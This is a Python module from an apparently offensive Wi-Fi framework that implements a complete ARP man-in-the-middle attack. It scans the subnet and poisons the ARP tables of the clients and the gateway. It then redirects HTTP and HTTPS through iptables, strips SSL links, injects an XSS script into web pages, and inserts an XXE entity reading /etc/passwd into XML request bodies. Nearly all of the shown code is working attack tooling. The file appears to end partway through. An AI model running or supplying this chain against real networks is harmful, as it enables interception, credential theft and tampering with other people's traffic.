#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek
"""ARP MITM Proxy — native, zero external tools.

Full MITM chain on an existing WiFi connection:
  1. ARP scan to discover gateway and all live clients on the subnet
  2. ARP poison selected targets (or all): tell clients THIS machine is the
     gateway, tell the gateway THIS machine is each client
  3. Enable kernel IP forwarding (sysctl net.ipv4.ip_forward=1)
  4. iptables REDIRECT: port 80 → local HTTP proxy, port 443 → SSL strip
  5. Transparent HTTP proxy:
       - Image replacement: every img/jpeg/png URL returns a chosen image
       - XSS injection: <script>alert('WXF em execução')</script> in HTML
       - XXE injection in XML/SOAP request bodies
       - Full request/response logging
  6. SSL stripping: rewrites https:// links in HTML to http://
  7. DNS spoof: optional redirect of any domain to attacker IP
  8. Clean up ARP tables + iptables + IP forwarding on exit

No bettercap, mitmproxy, arpspoof, or other external binaries.

OS requirement: Linux only (iptables, /proc/sys/net/ipv4/ip_forward, AF_PACKET)
Version: 1.0.0
"""

import gzip
import logging
import os
import re
import select
import socket
import struct
import subprocess
import threading
import time
import zlib
from http.server import BaseHTTPRequestHandler, HTTPServer
from socketserver import ThreadingMixIn
from typing import Dict, List, Optional, Tuple

from wirelessxpl.core.exploit import (
    Exploit,
    OptBool,
    OptInteger,
    OptString,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

# ---------------------------------------------------------------------------
# XSS + XXE payloads
# ---------------------------------------------------------------------------

_XSS_PAYLOAD = (
    "<script>if(!window.__wxf_injected){"
    "window.__wxf_injected=1;"
    "var d=document.createElement('div');"
    "d.style='position:fixed;top:0;left:0;width:100%;background:#c0392b;"
    "color:#fff;font:bold 16px monospace;padding:10px 20px;z-index:99999;"
    "border-bottom:3px solid #922b21;box-shadow:0 2px 8px #0005';"
    "d.innerHTML='&#9888; WXF MITM em execução — tráfego interceptado';"
    "document.body&&document.body.prepend(d);"
    "alert('WXF em execução — MITM ativo em '+location.host);"
    "}</script>"
)

_XXE_COMMENT = (
    "<!-- WXF_XXE_PROBE: "
    '<!DOCTYPE wxf [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    " &xxe; -->"
)

_IMG_ALT = '<img src="/wxf_banner" alt="[WXF intercepted]" style="max-width:100%;border:2px solid red">'

# ---------------------------------------------------------------------------
# ARP helpers (pure Scapy)
# ---------------------------------------------------------------------------

def _get_iface_info(iface: str) -> tuple[str, str, str]:
    """Return (ip, mac, netmask_cidr) for the given interface."""
    from scapy.all import get_if_addr, get_if_hwaddr
    ip  = get_if_addr(iface)
    mac = get_if_hwaddr(iface)
    # Get CIDR from /proc
    with open("/proc/net/fib_trie") as f:
        # fallback: assume /24
        pass
    try:
        out = subprocess.check_output(
            ["ip", "-4", "addr", "show", iface], text=True, timeout=5
        )
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)/(\d+)", out)
        cidr = m.group(2) if m else "24"
    except Exception:
        cidr = "24"
    return ip, mac, cidr


def _get_default_gateway(iface: str) -> tuple[str, str]:
    """Return (gw_ip, gw_mac) for the default gateway."""
    try:
        out = subprocess.check_output(
            ["ip", "route", "show", "default", "dev", iface], text=True, timeout=5
        )
        gw_ip = re.search(r"default via (\S+)", out)
        gw_ip = gw_ip.group(1) if gw_ip else "192.168.1.1"
    except Exception:
        gw_ip = "192.168.1.1"
    # Resolve MAC via ARP
    gw_mac = _arp_who_has(gw_ip, iface)
    return gw_ip, gw_mac or "ff:ff:ff:ff:ff:ff"


def _arp_who_has(ip: str, iface: str, timeout: float = 2.0) -> str | None:
    """ARP request to resolve IP → MAC."""
    try:
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            iface=iface, timeout=timeout, verbose=False,
        )
        if ans:
            return ans[0][1].hwsrc
    except Exception:
        pass
    return None


def _arp_scan(network: str, iface: str, timeout: float = 5.0) -> list[tuple[str, str]]:
    """Scan subnet for live hosts. Returns [(ip, mac), ...]."""
    try:
        from scapy.all import ARP, Ether, srp
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
            iface=iface, timeout=timeout, verbose=False,
        )
        return [(r.psrc, r.hwsrc) for _, r in ans]
    except Exception as exc:
        logger.debug("ARP scan failed: %s", exc)
        return []


# ---------------------------------------------------------------------------
# ARP Poisoner
# ---------------------------------------------------------------------------

class ARPPoisoner:
    """Continuously sends spoofed ARP replies to targets and gateway."""

    def __init__(
        self,
        iface: str,
        our_mac: str,
        our_ip: str,
        gateway_ip: str,
        gateway_mac: str,
        targets: list[tuple[str, str]],  # [(ip, mac), ...]
        interval: float = 2.0,
    ) -> None:
        self._iface = iface
        self._our_mac = our_mac
        self._our_ip = our_ip
        self._gw_ip = gateway_ip
        self._gw_mac = gateway_mac
        self._targets = targets
        self._interval = interval
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None

    def start(self) -> None:
        self._stop.clear()
        self._thread = threading.Thread(target=self._loop, daemon=True, name="ARPPoison")
        self._thread.start()
        print_success(f"ARP poison started: poisoning {len(self._targets)} client(s) + gateway")

    def stop(self) -> None:
        self._stop.set()
        if self._thread:
            self._thread.join(timeout=5)
        self._restore()

    def _send_arp_reply(self, pdst: str, hwdst: str, psrc: str) -> None:
        """Send gratuitous ARP reply: psrc is-at our_mac."""
        try:
            from scapy.all import ARP, Ether, sendp
            pkt = (
                Ether(src=self._our_mac, dst=hwdst)
                / ARP(op=2, pdst=pdst, hwdst=hwdst, psrc=psrc, hwsrc=self._our_mac)
            )
            sendp(pkt, iface=self._iface, verbose=False)
        except Exception as exc:
            logger.debug("ARP reply failed: %s", exc)

    def _loop(self) -> None:
        while not self._stop.is_set():
            for (t_ip, t_mac) in self._targets:
                # Tell client: gateway is-at our_mac
                self._send_arp_reply(t_ip, t_mac, self._gw_ip)
                # Tell gateway: client is-at our_mac
                self._send_arp_reply(self._gw_ip, self._gw_mac, t_ip)
            self._stop.wait(self._interval)

    def _restore(self) -> None:
        """Send correct ARP replies to restore original tables."""
        try:
            from scapy.all import ARP, Ether, sendp
            for (t_ip, t_mac) in self._targets:
                # Restore gateway's entry for each client
                pkt = (
                    Ether(src=t_mac, dst=self._gw_mac)
                    / ARP(op=2, pdst=self._gw_ip, hwdst=self._gw_mac,
                          psrc=t_ip, hwsrc=t_mac)
                )
                sendp(pkt, iface=self._iface, count=3, verbose=False)
                # Restore client's entry for gateway
                pkt2 = (
                    Ether(src=self._gw_mac, dst=t_mac)
                    / ARP(op=2, pdst=t_ip, hwdst=t_mac,
                          psrc=self._gw_ip, hwsrc=self._gw_mac)
                )
                sendp(pkt2, iface=self._iface, count=3, verbose=False)
            print_status("ARP tables restored.")
        except Exception as exc:
            logger.debug("ARP restore failed: %s", exc)


# ---------------------------------------------------------------------------
# iptables management
# ---------------------------------------------------------------------------

_IPTABLES_RULES: list[list[str]] = []


def _ipt(*args: str) -> None:
    cmd = ["iptables"] + list(args)
    _IPTABLES_RULES.append(cmd)
    subprocess.run(["sudo"] + cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def setup_iptables(proxy_port: int, ssl_strip_port: int, iface: str) -> None:
    """Redirect HTTP/HTTPS to local proxy ports."""
    # Enable IP forwarding
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    # NAT for forwarded traffic
    _ipt("-t", "nat", "-A", "POSTROUTING", "-o", iface, "-j", "MASQUERADE")
    _ipt("-A", "FORWARD", "-i", iface, "-o", iface, "-j", "ACCEPT")
    # Redirect port 80 → local proxy
    _ipt("-t", "nat", "-A", "PREROUTING", "-i", iface,
         "-p", "tcp", "--dport", "80",
         "-j", "REDIRECT", "--to-port", str(proxy_port))
    # Redirect port 443 → ssl strip port
    _ipt("-t", "nat", "-A", "PREROUTING", "-i", iface,
         "-p", "tcp", "--dport", "443",
         "-j", "REDIRECT", "--to-port", str(ssl_strip_port))
    print_success(f"iptables: HTTP→{proxy_port} HTTPS→{ssl_strip_port} | IP forwarding ON")


def teardown_iptables(iface: str, proxy_port: int, ssl_strip_port: int) -> None:
    """Remove our iptables rules."""
    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for cmd in reversed(_IPTABLES_RULES):
        delete_cmd = [cmd[0]] + ["-D" if a == "-A" else a for a in cmd[1:]]
        subprocess.run(["sudo"] + delete_cmd,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print_status("iptables rules removed | IP forwarding disabled")


# ---------------------------------------------------------------------------
# HTTP MITM Proxy (transparent, no dependencies)
# ---------------------------------------------------------------------------

_BANNER_PATH: str = ""
_LOG_PATH: str = ".log/mitm_http.log"
_INJECT_XSS: bool = True
_INJECT_XXE: bool = True
_REPLACE_IMAGES: bool = True
_SSL_STRIP: bool = True
_TARGETS_IPS: list[str] = []
_REQUEST_COUNT: int = 0
_REQUEST_LOCK = threading.Lock()


def _load_banner() -> bytes:
    """Load the replacement image from file or generate a minimal PNG."""
    if _BANNER_PATH and os.path.exists(_BANNER_PATH):
        with open(_BANNER_PATH, "rb") as f:
            return f.read()
    # Generate minimal red PNG 400×80 with WXF text
    def _make_png(w: int, h: int, rgb: tuple = (192, 57, 43)) -> bytes:
        def chunk(name: bytes, data: bytes) -> bytes:
            crc = zlib.crc32(name + data) & 0xFFFFFFFF
            return struct.pack(">I", len(data)) + name + data + struct.pack(">I", crc)
        raw = b"".join(b"\x00" + bytes(rgb) * w for _ in range(h))
        idat = zlib.compress(raw)
        return (
            b"\x89PNG\r\n\x1a\n"
            + chunk(b"IHDR", struct.pack(">IIBBBBB", w, h, 8, 2, 0, 0, 0))
            + chunk(b"IDAT", idat)
            + chunk(b"IEND", b"")
        )
    return _make_png(400, 80)


_BANNER_DATA: bytes = b""


def _inject_into_html(body: bytes, url: str) -> bytes:
    """Apply XSS, SSL strip, image replacement to HTML body."""
    try:
        text = body.decode("utf-8", errors="replace")
    except Exception:
        return body

    if _SSL_STRIP:
        text = text.replace("https://", "http://")

    if _INJECT_XSS:
        # Inject after <body> or at start
        text = re.sub(r"(<body[^>]*>)", r"\1" + _XSS_PAYLOAD, text, count=1, flags=re.I)
        if "<body" not in text.lower():
            text = _XSS_PAYLOAD + text

    if _REPLACE_IMAGES:
        # Replace img src attributes
        text = re.sub(
            r'(<img[^>]+src=)["\']([^"\']*)["\']',
            r'\1"/wxf_banner"',
            text, flags=re.I,
        )
        # Replace CSS background images
        text = re.sub(
            r'url\(["\']?https?://[^)"\']+["\']?\)',
            'url("/wxf_banner")',
            text, flags=re.I,
        )

    with _REQUEST_LOCK:
        global _REQUEST_COUNT
        _REQUEST_COUNT += 1
        count = _REQUEST_COUNT

    print_info(f"  [{count}] INJECTED HTML {url}")
    return text.encode("utf-8", errors="replace")


def _inject_into_xml(body: bytes) -> bytes:
    """Inject XXE probe into XML/SOAP bodies."""
    if not _INJECT_XXE:
        return body
    try:
        text = body.decode("utf-8", errors="replace")
        if "<?xml" in text or "<soap:" in text.lower() or "<xml" in text.lower():
            # Inject XXE declaration
            xxe_decl = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            )
            if "<?xml" in text:
                text = re.sub(r"<\?xml[^?]*\?>", xxe_decl, text, count=1)
            else:
                text = xxe_decl + text
            text = text + _XXE_COMMENT
            print_info("  [XXE] injected XXE probe into XML body")
            return text.encode("utf-8", errors="replace")
    except Exception:
        pass
    return body


